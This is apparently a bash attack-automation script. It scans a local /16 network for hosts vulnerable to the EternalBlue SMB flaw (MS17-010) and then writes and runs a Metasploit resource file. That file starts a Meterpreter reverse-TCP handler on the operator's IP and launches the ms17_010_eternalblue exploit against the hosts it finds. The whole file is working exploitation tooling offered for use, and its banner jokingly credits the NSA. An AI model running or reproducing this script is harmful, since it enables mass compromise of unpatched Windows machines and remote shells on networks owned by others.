#!/usr/bin/env bash

# author: github.com/nsa

# run as sudo
# sudo is necessary for scanning eternalblues and 
# metasploit framework
echo "Special thanks to";
echo " | \ | |/ ____|  /\    ";
echo " |  \| | (___   /  \   ";
echo " | .   |\___ \ / /\ \  ";
echo " | |\  |____) / ____ \ ";
echo " |_| \_|_____/_/    \_\ ";
echo "https://github.com/nsa";
echo "";

# checks if this script running as sudo or not.
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root" 1>&2;
   exit 1;
fi

assetsdir="assets/";
# cloning eternal_scanner from its github repo
if [ ! -d "assets/eternal_scanner" ]; then
    git clone https://github.com/peterpt/eternal_scanner.git "$assetsdir"eternal_scanner;
    chmod +x assets/eternal_scanner/escan;
else 
    chmod +x assets/eternal_scanner/escan;
fi

# read user IP from user.
read -p 'YOUR IP: ' yourIP;
if [ -z $yourIP ]; then
    echo "YOUR IP parameter cannot be empty"; exit 1;
fi

# parses your ip into ip{1-4}
ip=$yourIP;
ip1=${ip%%.*};
ip=${ip#*.*};
ip2=${ip%%.*};
ip=${ip#*.*};
ip3=${ip%%.*};
ip=${ip#*.*};
ip4=${ip%%.*};

# check whether vuln.txt exists or not
if [ ! -f /usr/local/share/Eternal_Scanner/vuln.txt ]; then
    echo "";
    echo "SCANNER STARTING...";
    echo "";
    cd assets/eternal_scanner 
    ./escan -i $ip1.$ip2.0.0/16
    cd ../..
    echo "";
    if [ ! -f /usr/local/share/Eternal_Scanner/vuln.txt ]; then
        echo ""
        echo "There is no IP addresses found"
        echo "Script exits due to no IP address"
        exit 1;
    fi
    echo "Parsing IPs...";
    python3 "$assetsdir"ipparser.py &

else
    echo "vuln.txt found"
    read -p 'Do you want to re-scan the network? (Y/n): ' check;
    if [ "$check" == "y" ] || [ "$check" == "yes" ] || [ "$check" == "Y" ]; then
        echo "";
        echo "Re-scanning please wait...";
        echo "";
        rm /usr/local/share/Eternal_Scanner/vuln.txt
        cd assets/eternal_scanner
        ./escan -i $ip1.$ip2.0.0/16
        cd ../..
        echo "";
        if [ ! -f /usr/local/share/Eternal_Scanner/vuln.txt ]; then
            echo ""
            echo "There is no IP addresses found"
            echo "Script exits due to no IP address"
            exit 1;
        fi
        echo "Parsing IPs...";
        python3 "$assetsdir"ipparser.py &
    else
        echo "Using existing IP addresses in vuln.txt";
        echo "";
        echo "Parsing IPs...";
        python3 "$assetsdir"ipparser.py &
    fi
fi

# sets metasploit reverse_tcp port, by default 31313
read -p 'CONNECTION PORT(default: 31313): ' port;
if [ -z $port ]; then
    port="31313";
fi

# sets the metasploit options into assets/nsa.rb file
echo "use exploit/multi/handler" > "$assetsdir"nsa.rb;
echo "set PAYLOAD windows/x64/meterpreter/reverse_tcp" >> "$assetsdir"nsa.rb;
echo "set autorunscript multi_console_command -rc assets/nsa.rc" >>"$assetsdir"nsa.rb;
echo "set lhost" $yourIP >> "$assetsdir"nsa.rb;
echo "set lport" $port >> "$assetsdir"nsa.rb;
echo "set ExitOnSession false" >> "$assetsdir"nsa.rb;
echo "exploit -j" >> "$assetsdir"nsa.rb;
echo "use exploit/windows/smb/ms17_010_eternalblue" >> "$assetsdir"nsa.rb;
echo "set VerifyArch false" >> "$assetsdir"nsa.rb;

# if user wants to continue then exploitS
read -p 'Do you want to proceed(y/n): ' check;
if [ "$check" == "y" ] || [ "$check" == "yes" ]; then
    echo "";
    echo "Running please wait..."; 
    msfconsole -r assets/iter.rc
else
    echo "Not Proceeded, USER EXIT"; exit 1;
fi
